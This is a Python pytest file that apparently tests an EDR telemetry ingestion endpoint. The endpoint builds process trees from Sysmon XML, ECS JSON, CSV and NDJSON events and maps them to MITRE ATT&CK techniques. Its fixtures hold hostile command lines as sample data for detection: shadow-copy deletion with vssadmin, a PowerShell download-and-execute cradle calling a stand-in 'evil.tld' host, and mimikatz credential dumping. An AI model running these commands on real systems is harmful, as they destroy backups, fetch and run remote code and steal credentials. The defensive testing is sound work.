"""Tests for Sysmon / EDR telemetry ingestion (P3)."""
import os
import json
import pytest
import httpx


BASE = os.environ.get("CYBERLAB_TEST_BASE", "http://localhost:8001")


@pytest.fixture(scope="module")
def client():
    with httpx.Client(base_url=BASE, timeout=15.0) as c:
        yield c


def test_process_tree_xml(client):
    xml = """<Events>
      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
        <System><EventID>1</EventID><TimeCreated SystemTime="2024-08-15T10:00:00Z"/></System>
        <EventData>
          <Data Name="ProcessGuid">{a}</Data><Data Name="ProcessId">100</Data>
          <Data Name="Image">C:\\Windows\\explorer.exe</Data>
          <Data Name="CommandLine">explorer.exe</Data>
          <Data Name="ParentProcessGuid">{root}</Data>
        </EventData>
      </Event>
      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
        <System><EventID>1</EventID><TimeCreated SystemTime="2024-08-15T10:00:05Z"/></System>
        <EventData>
          <Data Name="ProcessGuid">{b}</Data><Data Name="ProcessId">2001</Data>
          <Data Name="Image">C:\\Windows\\System32\\powershell.exe</Data>
          <Data Name="CommandLine">powershell.exe -EncodedCommand JABvAHMA</Data>
          <Data Name="ParentProcessGuid">{a}</Data>
        </EventData>
      </Event>
      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
        <System><EventID>1</EventID><TimeCreated SystemTime="2024-08-15T10:00:06Z"/></System>
        <EventData>
          <Data Name="ProcessGuid">{c}</Data><Data Name="ProcessId">2002</Data>
          <Data Name="Image">C:\\Windows\\System32\\vssadmin.exe</Data>
          <Data Name="CommandLine">vssadmin.exe delete shadows /all /quiet</Data>
          <Data Name="ParentProcessGuid">{b}</Data>
        </EventData>
      </Event>
    </Events>"""
    r = client.post("/api/cyberlab/process-tree", json={"input": xml})
    assert r.status_code == 200
    d = r.json()
    assert d["format"] == "xml"
    assert d["stats"]["process_count"] == 3
    assert d["stats"]["edge_count"] == 2
    # Explorer at depth 0, powershell at 1, vssadmin at 2
    depths = {n["image_short"]: n["depth"] for n in d["nodes"]}
    assert depths["explorer.exe"] == 0
    assert depths["powershell.exe"] == 1
    assert depths["vssadmin.exe"] == 2
    # MITRE mapping fired
    risks = {n["image_short"]: n["risk"] for n in d["nodes"]}
    assert risks["explorer.exe"] == "info"
    assert risks["vssadmin.exe"] in ("medium", "high", "critical")


def test_process_tree_json_ecs(client):
    events = [
        {"@timestamp": "2024-08-15T10:00:00Z", "event": {"code": "1"},
         "process": {"entity_id": "aaa", "pid": 100, "executable": "explorer.exe",
                     "command_line": "explorer.exe",
                     "parent": {"entity_id": "root", "pid": 4, "executable": "wininit.exe"}}},
        {"@timestamp": "2024-08-15T10:00:05Z", "event": {"code": "1"},
         "process": {"entity_id": "bbb", "pid": 2001, "executable": "powershell.exe",
                     "command_line": "powershell IEX (new-object Net.WebClient).DownloadString('https://evil.tld/x')",
                     "parent": {"entity_id": "aaa", "pid": 100, "executable": "explorer.exe"}}},
    ]
    r = client.post("/api/cyberlab/process-tree", json={"input": json.dumps(events)})
    assert r.status_code == 200
    d = r.json()
    assert d["format"] == "json"
    assert d["stats"]["process_count"] == 2
    # powershell should map to at least T1059.001 + T1105
    ps = next(n for n in d["nodes"] if n["image_short"] == "powershell.exe")
    tech_ids = {t["id"] for t in ps["techniques"]}
    assert "T1059.001" in tech_ids
    assert ps["risk"] in ("medium", "high", "critical")


def test_process_tree_csv(client):
    csv = ("UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentProcessGuid\n"
           "2024-08-15T10:00:00Z,{a},100,explorer.exe,explorer.exe,{root}\n"
           "2024-08-15T10:00:05Z,{b},2001,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords privilege::debug,{a}\n")
    r = client.post("/api/cyberlab/process-tree", json={"input": csv})
    assert r.status_code == 200
    d = r.json()
    assert d["format"] == "csv"
    assert d["stats"]["process_count"] == 2
    mimi = next(n for n in d["nodes"] if "mimikatz" in n["image_short"])
    assert "T1003.001" in {t["id"] for t in mimi["techniques"]}


def test_process_tree_bad_input_returns_400(client):
    r = client.post("/api/cyberlab/process-tree", json={"input": "just some random text"})
    assert r.status_code == 400
    assert "Unrecognized" in r.json()["detail"] or "process-create" in r.json()["detail"]


def test_process_tree_empty_string(client):
    r = client.post("/api/cyberlab/process-tree", json={"input": ""})
    assert r.status_code == 400


def test_process_tree_ndjson(client):
    ndjson = ('{"@timestamp":"2024-08-15T10:00:00Z","event":{"code":"1"},'
              '"process":{"entity_id":"aaa","pid":100,"executable":"cmd.exe",'
              '"command_line":"cmd.exe /c whoami"}}\n'
              '{"@timestamp":"2024-08-15T10:00:01Z","event":{"code":"1"},'
              '"process":{"entity_id":"bbb","pid":200,"executable":"net.exe",'
              '"command_line":"net user administrator",'
              '"parent":{"entity_id":"aaa","pid":100}}}\n')
    r = client.post("/api/cyberlab/process-tree", json={"input": ndjson})
    assert r.status_code == 200
    d = r.json()
    assert d["stats"]["process_count"] == 2
    assert d["stats"]["edge_count"] == 1
